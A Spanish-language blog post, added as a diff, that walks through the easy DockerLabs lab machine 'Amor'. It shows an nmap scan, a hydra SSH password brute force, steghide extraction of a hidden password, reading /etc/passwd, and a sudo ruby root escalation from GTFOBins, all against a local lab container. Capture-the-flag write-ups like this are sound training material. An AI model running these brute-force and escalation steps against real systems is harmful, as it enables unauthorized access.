@@ -1,0 +1,94 @@
+---
+layout: post
+title: "Amor"
+date: 2024-08-21 12:40:23
+category: dockerlabs
+vm: dockerlabsfacil
+---
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Amor </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/dockerlabs/amor/host.png){:.margin}
+
+**1\.** Comenzamos escaneando los puertos de la maquina.
+
+`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/amor/nmap.png){:.margin}
+
+**2\.** En la web tenemos una pagina con algunas descripciones, por debajo encontramos usuarios como juan o carlota.
+
+`http://172.17.0.2/`
+
+![img](/notas/public/img/dockerlabs/amor/80.png){:.margin}
+
+**3\.** Hacemos bruteforce por el ssh en busca de la contraseña, en este caso nos pilla de carlota.
+
+`hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64`
+
+![img](/notas/public/img/dockerlabs/amor/hydra.png){:.margin}
+
+**4\.** Nos conectamos por ssh con las credenciales obtenidas.
+
+`ssh carlota@172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/amor/sshcarlota.png){:.margin}
+
+**5\.** Una vez dentro indagando un poco, encontramos una imagen, nos lo descargamos en local.
+
+`cd Desktop/fotos/vacaciones/`
+
+`python3 -m http.server 5000`
+
+`wget http://172.17.0.2:5000/imagen.jpg -q`
+
+![img](/notas/public/img/dockerlabs/amor/imagen.png){:.margin}
+
+**6\.** Extraemos los metadatos, nos da un archivo de texto que contiene un base64, procedemos a decodificarlo.
+
+`steghide --extract -sf imagen.jpg`
+
+![img](/notas/public/img/dockerlabs/amor/decode.png){:.margin}
+
+**7\.** Revisamos los usuarios del sistema, por otro lado revisamos las variables de entorno donde encontramos un mensaje. 
+
+`grep sh$ /etc/passwd`
+
+`env`
+
+![img](/notas/public/img/dockerlabs/amor/msg.png){:.margin}
+
+**8\.** Migramos al usuario oscar con la contraseña decodificada de base64.
+
+`su oscar`
+
+`script /dev/null -c bash`
+
+![img](/notas/public/img/dockerlabs/amor/suoscar.png){:.margin}
+
+**9\.** Revisando los permisos sudo encontramos el binario ruby con todos los permisos.
+
+`sudo -l`
+
+![img](/notas/public/img/dockerlabs/amor/sudol.png){:.margin}
+
+**10\.** Escalamos a root con este metodo de [gtfobins](https://gtfobins.github.io/gtfobins/ruby/#sudo).
+
+`sudo ruby -e 'exec "/bin/sh"'`
+
+![img](/notas/public/img/dockerlabs/amor/root.png){:.margin}
+
+<br>
+
+<a href="#">_Finalizado._</a>
